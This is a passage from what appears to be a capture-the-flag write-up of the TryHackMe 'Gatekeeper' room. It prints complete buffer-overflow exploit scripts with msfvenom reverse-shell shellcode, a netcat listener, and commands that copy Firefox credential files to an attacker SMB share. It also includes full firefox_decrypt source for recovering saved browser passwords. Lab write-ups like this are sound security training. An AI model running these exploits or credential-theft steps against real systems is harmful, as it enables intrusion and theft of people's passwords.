"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
"\x36\x65\x59\x74\x36\xac")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- ![image](https://user-images.githubusercontent.com/94720207/169708756-d21de7b0-e434-4972-8ab7-86a28c0e4bb9.png)

- **You can now exploit the buffer overflow to get a reverse shell!**

    - Start a netcat listener on your Kali box using the `LPORT` you specified in the `msfvenom` command eg. `4444`
    
        - `rlwrap nc -nlvp 4444`
        
        - ![image](https://user-images.githubusercontent.com/94720207/169708775-d35349cf-2ecb-4cec-8e3b-6bff31f3c72a.png)
  
    - Restart `gatekeeper.exe` (`Immunity Debugger` not needed anymore) and run the modified `overflow_gatekeeper_step567_Final_Payload.py` script.
    
    - Que chille!!!
    
        - `python3 overflow_gatekeeper_step567_Final_Payload.py` 

        - **Your netcat listener should catch a reverse shell!**
        
            - ![image](https://user-images.githubusercontent.com/94720207/169709134-a9fbb111-dca8-44c0-b8ac-85a317417eb6.png)

---

### Attacking the real Gatekeeper Server

- This final step is very easy, we only need to point agains the `Real Gatekeeper Server` instead my bare metal Windows 10 PC.

    - To do that, we only need to change the payload from `msfvenom` with another LHOST & LPORT poining my THM-VPN (instead my local  192.168.1.100/24) 
            
        - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00\x0A" -f c` 
        
        - ![image](https://user-images.githubusercontent.com/94720207/169709512-bfebae53-e35f-4ede-b886-b5581d060016.png)
     
    - Also change the python script to pint the RHOST & RPORT of the Gatekeeper Server (THM machine)
    
    - ![image](https://user-images.githubusercontent.com/94720207/169709901-11d9ff3d-f66d-4029-a146-7de47124ea14.png)
      
        - ip = "10.10.25.92"
        - port = 31337 

- **Final Script:**

    - **`z_GATEKEEPER_FZ3R0_PWN_666.py`**
 
```python
import socket

ip = "10.10.5.62"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xbb\x45\xf0\x26\x18\xdd\xc1\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x58\x12\x83\xc0\x04\x03\x1d\xfe\xc4\xed\x61\x16\x8a"
"\x0e\x99\xe7\xeb\x87\x7c\xd6\x2b\xf3\xf5\x49\x9c\x77\x5b\x66"
"\x57\xd5\x4f\xfd\x15\xf2\x60\xb6\x90\x24\x4f\x47\x88\x15\xce"
"\xcb\xd3\x49\x30\xf5\x1b\x9c\x31\x32\x41\x6d\x63\xeb\x0d\xc0"
"\x93\x98\x58\xd9\x18\xd2\x4d\x59\xfd\xa3\x6c\x48\x50\xbf\x36"
"\x4a\x53\x6c\x43\xc3\x4b\x71\x6e\x9d\xe0\x41\x04\x1c\x20\x98"
"\xe5\xb3\x0d\x14\x14\xcd\x4a\x93\xc7\xb8\xa2\xe7\x7a\xbb\x71"
"\x95\xa0\x4e\x61\x3d\x22\xe8\x4d\xbf\xe7\x6f\x06\xb3\x4c\xfb"
"\x40\xd0\x53\x28\xfb\xec\xd8\xcf\x2b\x65\x9a\xeb\xef\x2d\x78"
"\x95\xb6\x8b\x2f\xaa\xa8\x73\x8f\x0e\xa3\x9e\xc4\x22\xee\xf6"
"\x29\x0f\x10\x07\x26\x18\x63\x35\xe9\xb2\xeb\x75\x62\x1d\xec"
"\x7a\x59\xd9\x62\x85\x62\x1a\xab\x42\x36\x4a\xc3\x63\x37\x01"
"\x13\x8b\xe2\x86\x43\x23\x5d\x67\x33\x83\x0d\x0f\x59\x0c\x71"
"\x2f\x62\xc6\x1a\xda\x99\x81\x2e\x1d\xda\x5c\x47\x23\x1c\x4e"
"\xcb\xaa\xfa\x1a\xe3\xfa\x55\xb3\x9a\xa6\x2d\x22\x62\x7d\x48"
"\x64\xe8\x72\xad\x2b\x19\xfe\xbd\xdc\xe9\xb5\x9f\x4b\xf5\x63"
"\xb7\x10\x64\xe8\x47\x5e\x95\xa7\x10\x37\x6b\xbe\xf4\xa5\xd2"
"\x68\xea\x37\x82\x53\xae\xe3\x77\x5d\x2f\x61\xc3\x79\x3f\xbf"
"\xcc\xc5\x6b\x6f\x9b\x93\xc5\xc9\x75\x52\xbf\x83\x2a\x3c\x57"
"\x55\x01\xff\x21\x5a\x4c\x89\xcd\xeb\x39\xcc\xf2\xc4\xad\xd8"
"\x8b\x38\x4e\x26\x46\xf9\x6e\xc5\x42\xf4\x06\x50\x07\xb5\x4a"
"\x63\xf2\xfa\x72\xe0\xf6\x82\x80\xf8\x73\x86\xcd\xbe\x68\xfa"
"\x5e\x2b\x8e\xa9\x5f\x7e")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("666:fz3r00t\> Sending the final Buffer Overflow with a sexy payload...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("")
  print("  I went to hell and came back with a treasure, enjoy your rooted reverse shell!!!") 
  print("")
  print("            Twitter:  Fz3r0_OPs")
  print("            Github :  Fz3r0")  
  print("")
  print("            I'm Fz3r0 and the Sun no longer rises...")
except:
  print("Could not connect.")
```

- ![image](https://user-images.githubusercontent.com/94720207/169709696-87d91e05-fb21-48de-9251-514b8770c053.png)

- The final victory, time to the real attack against the Gatekeeper Server, execute script!!!:

    - ![image](https://user-images.githubusercontent.com/94720207/169710594-dca8bb91-27a4-45bd-8475-28652151f88f.png)

- **Reverse shell user privileges gained from gatekeeper Server!!! It's done! :D** 

    - NOTE: Ignore the "root shell" message from my script hehe, it look cooler in scenarios where App is executed as root (as many apps hosted in servers in "real life") 

---

### Privilege Escalation

- After some Enummeration I found that the PrivEsc vector was using the firefox profile.

    - ![image](https://user-images.githubusercontent.com/94720207/169711913-df2264c8-6b38-46a5-a891-c8213b716535.png)
  
- **I will use this technique for PrivEsc that I've found for this scenario, the original writeup recomend to use Metasploit but I will do it manual OSCP style.**

    - https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data
    - https://www.howtogeek.com/69051/stupid-geek-tricks-hacking-the-firefox-profile-data-storage/

- To perform this PrivEsc I need the following files:

    1. `logins.json` and `key4.db` where passwords are stored
    2. `cert9.db` which contains all security certificate settings

- These files are stored under `%APPDATA%\Mozilla\Firefox\Profiles\`

    -  `cd %APPDATA%\Mozilla\Firefox\Profiles\`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169714731-026afa4c-7ae7-4384-9064-b38dc7c0a791.png)

    - ![image](https://user-images.githubusercontent.com/94720207/169714810-1a16737c-b4c8-4c52-86ea-46afe9a10cde.png)

- Now, I need to send the files to my Kali machine, I will setup a `smb share` between `Gatekeeper Server` and `LHOST (Kali)`

- I will do a special directory for that share called `/gatekeeper_share` 
    
    - `/usr/share/doc/python3-impacket/examples/smbserver.py share .` 
        
    - ![image](https://user-images.githubusercontent.com/94720207/169715156-5417fb6f-d428-450d-83d3-cff933295081.png)

- Copy the files - From Windows to Kali via SMB:

    - `copy logins.json \\10.6.123.13\share` 
    - `copy key4.db \\10.6.123.13\share` 
    - `copy cert9.db \\10.6.123.13\share`

- ![image](https://user-images.githubusercontent.com/94720207/169715456-188fb4fd-d4f4-489d-980c-f0a45c6f3d08.png)

- I will use the following tool to exploit those files:

    - [<< FireFox_Decrypt Tool DOWNLOAD >>](https://github.com/Fz3r0/firefox_decrypt)

    - ![image](https://user-images.githubusercontent.com/94720207/169715775-1daf04a4-afe6-4f21-963f-30ff73eaf813.png)
    
    - ![image](https://user-images.githubusercontent.com/94720207/169716016-2ca2f4de-f5ba-463e-979c-326fa9551199.png)

### Exploit Source-Code - `FireFox_Decrypt` @ python

<details>
  <summary>Click to see the python script!</summary>

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

# Based on original work from: www.dumpzilla.org

from __future__ import annotations

import argparse
import csv
import ctypes as ct
import json
import logging
import locale
import os
import platform
import sqlite3
import sys
import shutil
from base64 import b64decode
from getpass import getpass
from itertools import chain
from subprocess import run, PIPE, DEVNULL
from urllib.parse import urlparse
from configparser import ConfigParser
from typing import Optional, Iterator, Any

LOG: logging.Logger
VERBOSE = False
SYSTEM = platform.system()
SYS64 = sys.maxsize > 2**32
DEFAULT_ENCODING = "utf-8"

PWStore = list[dict[str, str]]

# NOTE: In 1.0.0-rc1 we tried to use locale information to encode/decode
# content passed to NSS. This was an attempt to address the encoding issues
# affecting Windows. However after additional testing Python now also defaults
# to UTF-8 for encoding.
# Some of the limitations of Windows have to do with poor support for UTF-8
# characters in cmd.exe. Terminal - https://github.com/microsoft/terminal or
# a Bash shell such as Git Bash - https://git-scm.com/downloads are known to
# provide a better user experience and are therefore recommended


def get_version() -> str:
    """Obtain version information from git if available otherwise use
    the internal version number
    """
    def internal_version():
        return '.'.join(map(str, __version_info__[:3])) + ''.join(__version_info__[3:])

    try:
        p = run(["git", "describe", "--tags"], stdout=PIPE, stderr=DEVNULL, text=True)
    except FileNotFoundError:
        return internal_version()

    if p.returncode:
        return internal_version()
    else:
        return p.stdout.strip()


__version_info__ = (1, 0, 0, "+git")
__version__: str = get_version()


class NotFoundError(Exception):
    """Exception to handle situations where a credentials file is not found
    """
    pass


class Exit(Exception):
    """Exception to allow a clean exit from any point in execution
    """
    CLEAN = 0
    ERROR = 1
    MISSING_PROFILEINI = 2
    MISSING_SECRETS = 3
    BAD_PROFILEINI = 4
    LOCATION_NO_DIRECTORY = 5
    BAD_SECRETS = 6
    BAD_LOCALE = 7

    FAIL_LOCATE_NSS = 10
    FAIL_LOAD_NSS = 11
    FAIL_INIT_NSS = 12
    FAIL_NSS_KEYSLOT = 13
    FAIL_SHUTDOWN_NSS = 14
    BAD_MASTER_PASSWORD = 15
    NEED_MASTER_PASSWORD = 16

    PASSSTORE_NOT_INIT = 20
    PASSSTORE_MISSING = 21
    PASSSTORE_ERROR = 22

    READ_GOT_EOF = 30
    MISSING_CHOICE = 31
    NO_SUCH_PROFILE = 32

    UNKNOWN_ERROR = 100
    KEYBOARD_INTERRUPT = 102

    def __init__(self, exitcode):
        self.exitcode = exitcode

    def __unicode__(self):
        return f"Premature program exit with exit code {self.exitcode}"


class Credentials:
    """Base credentials backend manager
    """
    def __init__(self, db):
        self.db = db

        LOG.debug("Database location: %s", self.db)
        if not os.path.isfile(db):
            raise NotFoundError(f"ERROR - {db} database not found\n")

        LOG.info("Using %s for credentials.", db)

    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
        pass

    def done(self):
        """Override this method if the credentials subclass needs to do any
        action after interaction
        """
        pass


class SqliteCredentials(Credentials):
    """SQLite credentials backend manager
    """
    def __init__(self, profile):
        db = os.path.join(profile, "signons.sqlite")

        super(SqliteCredentials, self).__init__(db)

        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
        LOG.debug("Reading password database in SQLite format")
        self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType "
                       "FROM moz_logins")
        for i in self.c:
            # yields hostname, encryptedUsername, encryptedPassword, encType
            yield i

    def done(self):
        """Close the sqlite cursor and database connection
        """
        super(SqliteCredentials, self).done()

        self.c.close()
        self.conn.close()


class JsonCredentials(Credentials):
    """JSON credentials backend manager
    """
    def __init__(self, profile):
        db = os.path.join(profile, "logins.json")

        super(JsonCredentials, self).__init__(db)

    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
        with open(self.db) as fh:
            LOG.debug("Reading password database in JSON format")
            data = json.load(fh)

            try:
                logins = data["logins"]
            except Exception:
                LOG.error(f"Unrecognized format in {self.db}")
                raise Exit(Exit.BAD_SECRETS)

            for i in logins:
                yield (i["hostname"], i["encryptedUsername"],
                       i["encryptedPassword"], i["encType"])


def find_nss(locations, nssname) -> ct.CDLL:
    """Locate nss is one of the many possible locations
    """
    fail_errors: list[tuple[str, str]] = []

    OS = ("Windows", "Darwin")

    for loc in locations:
        nsslib = os.path.join(loc, nssname)
        LOG.debug("Loading NSS library from %s", nsslib)

        if SYSTEM in OS:
            # On windows in order to find DLLs referenced by nss3.dll
            # we need to have those locations on PATH
            os.environ["PATH"] = ';'.join([loc, os.environ["PATH"]])
            LOG.debug("PATH is now %s", os.environ["PATH"])
            # However this doesn't seem to work on all setups and needs to be
            # set before starting python so as a workaround we chdir to
            # Firefox's nss3.dll/libnss3.dylib location
            if loc:
                if not os.path.isdir(loc):
                    # No point in trying to load from paths that don't exist
                    continue

                workdir = os.getcwd()
                os.chdir(loc)

        try:
            nss: ct.CDLL = ct.CDLL(nsslib)
        except OSError as e:
            fail_errors.append((nsslib, str(e)))
        else:
            LOG.debug("Loaded NSS library from %s", nsslib)
            return nss
        finally:
            if SYSTEM in OS and loc:
                # Restore workdir changed above
                os.chdir(workdir)

    else:
        LOG.error("Couldn't find or load '%s'. This library is essential "
                  "to interact with your Mozilla profile.", nssname)
        LOG.error("If you are seeing this error please perform a system-wide "
                  "search for '%s' and file a bug report indicating any "
                  "location found. Thanks!", nssname)
        LOG.error("Alternatively you can try launching firefox_decrypt "
                  "from the location where you found '%s'. "
                  "That is 'cd' or 'chdir' to that location and run "
                  "firefox_decrypt from there.", nssname)

        LOG.error("Please also include the following on any bug report. "
                  "Errors seen while searching/loading NSS:")

        for target, error in fail_errors:
            LOG.error("Error when loading %s was %s", target, error)

        raise Exit(Exit.FAIL_LOCATE_NSS)


def load_libnss():
    """Load libnss into python using the CDLL interface
    """
    if SYSTEM == "Windows":
        nssname = "nss3.dll"
        if SYS64:
            locations: list[str] = [
                "",  # Current directory or system lib finder
                os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
                os.path.expanduser("~\\AppData\\Local\\Mozilla Thunderbird"),
                os.path.expanduser("~\\AppData\\Local\\Nightly"),
                os.path.expanduser("~\\AppData\\Local\\SeaMonkey"),
                os.path.expanduser("~\\AppData\\Local\\Waterfox"),
                "C:\\Program Files\\Mozilla Firefox",
                "C:\\Program Files\\Mozilla Thunderbird",
                "C:\\Program Files\\Nightly",
                "C:\\Program Files\\SeaMonkey",
                "C:\\Program Files\\Waterfox",
            ]
        else:
            locations: list[str] = [
                "",  # Current directory or system lib finder
                "C:\\Program Files (x86)\\Mozilla Firefox",
                "C:\\Program Files (x86)\\Mozilla Thunderbird",
                "C:\\Program Files (x86)\\Nightly",
                "C:\\Program Files (x86)\\SeaMonkey",
                "C:\\Program Files (x86)\\Waterfox",
                # On windows 32bit these folders can also be 32bit
                os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
                os.path.expanduser("~\\AppData\\Local\\Mozilla Thunderbird"),
                os.path.expanduser("~\\AppData\\Local\\Nightly"),
                os.path.expanduser("~\\AppData\\Local\\SeaMonkey"),
                os.path.expanduser("~\\AppData\\Local\\Waterfox"),
                "C:\\Program Files\\Mozilla Firefox",
                "C:\\Program Files\\Mozilla Thunderbird",
                "C:\\Program Files\\Nightly",
                "C:\\Program Files\\SeaMonkey",
                "C:\\Program Files\\Waterfox",
            ]

        # If either of the supported software is in PATH try to use it
        software = ["firefox", "thunderbird", "waterfox", "seamonkey"]
        for binary in software:
            location: Optional[str] = shutil.which(binary)
            if location is not None:
                nsslocation: str = os.path.join(os.path.dirname(location), nssname)
                locations.append(nsslocation)

    elif SYSTEM == "Darwin":
        nssname = "libnss3.dylib"
        locations = (
            "",  # Current directory or system lib finder
            "/usr/local/lib/nss",
            "/usr/local/lib",
            "/opt/local/lib/nss",
            "/sw/lib/firefox",
            "/sw/lib/mozilla",
            "/usr/local/opt/nss/lib",  # nss installed with Brew on Darwin
            "/opt/pkg/lib/nss",  # installed via pkgsrc
            "/Applications/Firefox.app/Contents/MacOS",  # default manual install location
            "/Applications/Thunderbird.app/Contents/MacOS",
            "/Applications/SeaMonkey.app/Contents/MacOS",
            "/Applications/Waterfox.app/Contents/MacOS",
        )

    else:
        nssname = "libnss3.so"
        if SYS64:
            locations = (
                "",  # Current directory or system lib finder
                "/usr/lib64",
                "/usr/lib64/nss",
                "/usr/lib",
                "/usr/lib/nss",
                "/usr/local/lib",
                "/usr/local/lib/nss",
                "/opt/local/lib",
                "/opt/local/lib/nss",
                os.path.expanduser("~/.nix-profile/lib"),
            )
        else:
            locations = (
                "",  # Current directory or system lib finder
                "/usr/lib",
                "/usr/lib/nss",
                "/usr/lib32",
                "/usr/lib32/nss",
                "/usr/lib64",
                "/usr/lib64/nss",
                "/usr/local/lib",
                "/usr/local/lib/nss",
                "/opt/local/lib",
                "/opt/local/lib/nss",
                os.path.expanduser("~/.nix-profile/lib"),
            )

    # If this succeeds libnss was loaded
    return find_nss(locations, nssname)


class c_char_p_fromstr(ct.c_char_p):
    """ctypes char_p override that handles encoding str to bytes"""
    def from_param(self):
        return self.encode(DEFAULT_ENCODING)


class NSSProxy:
    class SECItem(ct.Structure):
        """struct needed to interact with libnss
        """
        _fields_ = [
            ('type', ct.c_uint),
            ('data', ct.c_char_p),  # actually: unsigned char *
            ('len', ct.c_uint),
        ]

        def decode_data(self):
            _bytes = ct.string_at(self.data, self.len)
            return _bytes.decode(DEFAULT_ENCODING)

    class PK11SlotInfo(ct.Structure):
        """Opaque structure representing a logical PKCS slot
        """

    def __init__(self):
        # Locate libnss and try loading it
        self.libnss = load_libnss()

        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
        SECItemPtr = ct.POINTER(self.SECItem)

        self._set_ctypes(ct.c_int, "NSS_Init", c_char_p_fromstr)
        self._set_ctypes(ct.c_int, "NSS_Shutdown")
        self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
        self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
        self._set_ctypes(ct.c_int, "PK11_NeedLogin", SlotInfoPtr)
        self._set_ctypes(ct.c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p_fromstr)
        self._set_ctypes(ct.c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, ct.c_void_p)
        self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, ct.c_int)

        # for error handling
        self._set_ctypes(ct.c_int, "PORT_GetError")
        self._set_ctypes(ct.c_char_p, "PR_ErrorToName", ct.c_int)
        self._set_ctypes(ct.c_char_p, "PR_ErrorToString", ct.c_int, ct.c_uint32)

    def _set_ctypes(self, restype, name, *argtypes):
        """Set input/output types on libnss C functions for automatic type casting
        """
        res = getattr(self.libnss, name)
        res.argtypes = argtypes
        res.restype = restype

        # Transparently handle decoding to string when returning a c_char_p
        if restype == ct.c_char_p:
            def _decode(result, func, *args):
                return result.decode(DEFAULT_ENCODING)
            res.errcheck = _decode

        setattr(self, "_" + name, res)

    def initialize(self, profile: str):
        # The sql: prefix ensures compatibility with both
        # Berkley DB (cert8) and Sqlite (cert9) dbs
        profile_path = "sql:" + profile
        LOG.debug("Initializing NSS with profile '%s'", profile_path)
        err_status: int = self._NSS_Init(profile_path)
        LOG.debug("Initializing NSS returned %s", err_status)

        if err_status:
            self.handle_error(
                Exit.FAIL_INIT_NSS,
                "Couldn't initialize NSS, maybe '%s' is not a valid profile?",
                profile,
            )

    def shutdown(self):
        err_status: int = self._NSS_Shutdown()

        if err_status:
            self.handle_error(
                Exit.FAIL_SHUTDOWN_NSS,
                "Couldn't shutdown current NSS profile",
            )

    def authenticate(self, profile, interactive):
        """Unlocks the profile if necessary, in which case a password
        will prompted to the user.
        """
        LOG.debug("Retrieving internal key slot")
        keyslot = self._PK11_GetInternalKeySlot()

        LOG.debug("Internal key slot %s", keyslot)
        if not keyslot:
            self.handle_error(
                Exit.FAIL_NSS_KEYSLOT,
                "Failed to retrieve internal KeySlot",
            )

        try:
            if self._PK11_NeedLogin(keyslot):
                password: str = ask_password(profile, interactive)

                LOG.debug("Authenticating with password '%s'", password)
                err_status: int = self._PK11_CheckUserPassword(keyslot, password)

                LOG.debug("Checking user password returned %s", err_status)

                if err_status:
                    self.handle_error(
                        Exit.BAD_MASTER_PASSWORD,
                        "Master password is not correct",
                    )

            else:
                LOG.info("No Master Password found - no authentication needed")
        finally:
            # Avoid leaking PK11KeySlot
            self._PK11_FreeSlot(keyslot)

    def handle_error(self, exitcode: int, *logerror: Any):
        """If an error happens in libnss, handle it and print some debug information
        """
        if logerror:
            LOG.error(*logerror)
        else:
            LOG.debug("Error during a call to NSS library, trying to obtain error info")

        code = self._PORT_GetError()
        name = self._PR_ErrorToName(code)
        name = "NULL" if name is None else name
        # 0 is the default language (localization related)
        text = self._PR_ErrorToString(code, 0)

        LOG.debug("%s: %s", name, text)

        raise Exit(exitcode)

    def decrypt(self, data64):
        data = b64decode(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)

        err_status: int = self._PK11SDR_Decrypt(inp, out, None)
        LOG.debug("Decryption of data returned %s", err_status)
        try:
            if err_status:  # -1 means password failed, other status are unknown
                self.handle_error(
                    Exit.NEED_MASTER_PASSWORD,
                    "Password decryption failed. Passwords protected by a Master Password!",
                )

            res = out.decode_data()
        finally:
            # Avoid leaking SECItem
            self._SECITEM_ZfreeItem(out, 0)

        return res


class MozillaInteraction:
    """
    Abstraction interface to Mozilla profile and lib NSS
    """
    def __init__(self):
        self.profile = None
        self.proxy = NSSProxy()

    def load_profile(self, profile):
        """Initialize the NSS library and profile
        """
        self.profile = profile
        self.proxy.initialize(self.profile)

    def authenticate(self, interactive):
        """Authenticate the the current profile is protected by a master password,
        prompt the user and unlock the profile.
        """
        self.proxy.authenticate(self.profile, interactive)

    def unload_profile(self):
        """Shutdown NSS and deactivate current profile
        """
        self.proxy.shutdown()

    def decrypt_passwords(self) -> PWStore:
        """Decrypt requested profile using the provided password.
        Returns all passwords in a list of dicts
        """
        credentials: Credentials = self.obtain_credentials()

        LOG.info("Decrypting credentials")
        outputs: list[dict[str, str]] = []

        url: str
        user: str
        passw: str
        enctype: int
        for url, user, passw, enctype in credentials:
            # enctype informs if passwords need to be decrypted
            if enctype:
                try:
                    LOG.debug("Decrypting username data '%s'", user)
                    user = self.proxy.decrypt(user)
                    LOG.debug("Decrypting password data '%s'", passw)
                    passw = self.proxy.decrypt(passw)
                except (TypeError, ValueError) as e:
                    LOG.warning("Failed to decode username or password for entry from URL %s", url)
                    LOG.exception(e)
                    continue

            LOG.debug("Decoded username '%s' and password '%s' for website '%s'", user, passw, url)

            output = {"url": url, "user": user, "password": passw}
            outputs.append(output)

        if not outputs:
            LOG.warning("No passwords found in selected profile")

        # Close credential handles (SQL)
        credentials.done()

        return outputs

    def obtain_credentials(self) -> Credentials:
        """Figure out which of the 2 possible backend credential engines is available
        """
        credentials: Credentials
        try:
            credentials = JsonCredentials(self.profile)
        except NotFoundError:
            try:
                credentials = SqliteCredentials(self.profile)
            except NotFoundError:
                LOG.error("Couldn't find credentials file (logins.json or signons.sqlite).")
                raise Exit(Exit.MISSING_SECRETS)

        return credentials


class OutputFormat:
    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
        self.pwstore = pwstore
        self.cmdargs = cmdargs

    def output(self):
        pass


class HumanOutputFormat(OutputFormat):
    def output(self):
        for output in self.pwstore:
            record: str = (
                f"\nWebsite:   {output['url']}\n"
                f"Username: '{output['user']}'\n"
                f"Password: '{output['password']}'\n"
            )
            sys.stdout.write(record)


class JSONOutputFormat(OutputFormat):
    def output(self):
        sys.stdout.write(json.dumps(self.pwstore, indent=2))
        # Json dumps doesn't add the final newline
        sys.stdout.write("\n")


class CSVOutputFormat(OutputFormat):
    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
        super().__init__(pwstore, cmdargs)
        self.delimiter = cmdargs.csv_delimiter
        self.quotechar = cmdargs.csv_quotechar
        self.header = cmdargs.csv_header

    def output(self):
        csv_writer = csv.DictWriter(
            sys.stdout,
            fieldnames=["url", "user", "password"],
            lineterminator="\n",
            delimiter=self.delimiter,
            quotechar=self.quotechar,
            quoting=csv.QUOTE_ALL,
        )
        if self.header:
            csv_writer.writeheader()

        for output in self.pwstore:
            csv_writer.writerow(output)


class TabularOutputFormat(CSVOutputFormat):
    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
        super().__init__(pwstore, cmdargs)
        self.delimiter = "\t"
        self.quotechar = "'"


class PassOutputFormat(OutputFormat):
    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
        super().__init__(pwstore, cmdargs)
        self.prefix = cmdargs.pass_prefix
        self.cmd = cmdargs.pass_cmd
        self.username_prefix = cmdargs.pass_username_prefix
        self.always_with_login = cmdargs.pass_always_with_login

    def output(self):
        self.test_pass_cmd()
        self.preprocess_outputs()
        self.export()

    def test_pass_cmd(self) -> None:
        """Check if pass from passwordstore.org is installed
        If it is installed but not initialized, initialize it
        """
        LOG.debug("Testing if password store is installed and configured")

        try:
            p = run([self.cmd, "ls"], capture_output=True, text=True)
        except FileNotFoundError as e:
            if e.errno == 2:
                LOG.error("Password store is not installed and exporting was requested")
                raise Exit(Exit.PASSSTORE_MISSING)
            else:
                LOG.error("Unknown error happened.")
                LOG.error("Error was '%s'", e)
                raise Exit(Exit.UNKNOWN_ERROR)

        LOG.debug("pass returned:\nStdout: %s\nStderr: %s", p.stdout, p.stderr)

        if p.returncode != 0:
            if 'Try "pass init"' in p.stderr:
                LOG.error("Password store was not initialized.")
                LOG.error("Initialize the password store manually by using 'pass init'")
                raise Exit(Exit.PASSSTORE_NOT_INIT)
            else:
                LOG.error("Unknown error happened when running 'pass'.")
                LOG.error("Stdout: %s\nStderr: %s", p.stdout, p.stderr)
                raise Exit(Exit.UNKNOWN_ERROR)

    def preprocess_outputs(self):
        # Format of "self.to_export" should be:
        #     {"address": {"login": "password", ...}, ...}
        self.to_export: dict[str, dict[str, str]] = {}

        for record in self.pwstore:
            url = record["url"]
            user = record["user"]
            passw = record["password"]

            # Keep track of web-address, username and passwords
            # If more than one username exists for the same web-address
            # the username will be used as name of the file
            address = urlparse(url)

            if address.netloc not in self.to_export:
                self.to_export[address.netloc] = {user: passw}

            else:
                self.to_export[address.netloc][user] = passw

    def export(self):
        """Export given passwords to password store

        Format of "to_export" should be:
            {"address": {"login": "password", ...}, ...}
        """
        LOG.info("Exporting credentials to password store")
        if self.prefix:
            prefix = f"{self.prefix}/"
        else:
            prefix = self.prefix

        LOG.debug("Using pass prefix '%s'", prefix)

        for address in self.to_export:
            for user, passw in self.to_export[address].items():
                # When more than one account exist for the same address, add
                # the login to the password identifier
                if self.always_with_login or len(self.to_export[address]) > 1:
                    passname = f"{prefix}{address}/{user}"
                else:
                    passname = f"{prefix}{address}"

                LOG.info("Exporting credentials for '%s'", passname)

                data = f"{passw}\n{self.username_prefix}{user}\n"

                LOG.debug("Inserting pass '%s' '%s'", passname, data)

                # NOTE --force is used. Existing passwords will be overwritten
                cmd: list[str] = [self.cmd, "insert", "--force", "--multiline", passname]

                LOG.debug("Running command '%s' with stdin '%s'", cmd, data)

                p = run(cmd, input=data, capture_output=True, text=True)

                if p.returncode != 0:
                    LOG.error("ERROR: passwordstore exited with non-zero: %s", p.returncode)
                    LOG.error("Stdout: %s\nStderr: %s", p.stdout, p.stderr)
                    raise Exit(Exit.PASSSTORE_ERROR)

                LOG.debug("Successfully exported '%s'", passname)


def get_sections(profiles):
    """
    Returns hash of profile numbers and profile names.
    """
    sections = {}
    i = 1
    for section in profiles.sections():
        if section.startswith("Profile"):
            sections[str(i)] = profiles.get(section, "Path")
            i += 1
        else:
            continue
    return sections


def print_sections(sections, textIOWrapper=sys.stderr):
    """
    Prints all available sections to an textIOWrapper (defaults to sys.stderr)
    """
    for i in sorted(sections):
        textIOWrapper.write(f"{i} -> {sections[i]}\n")
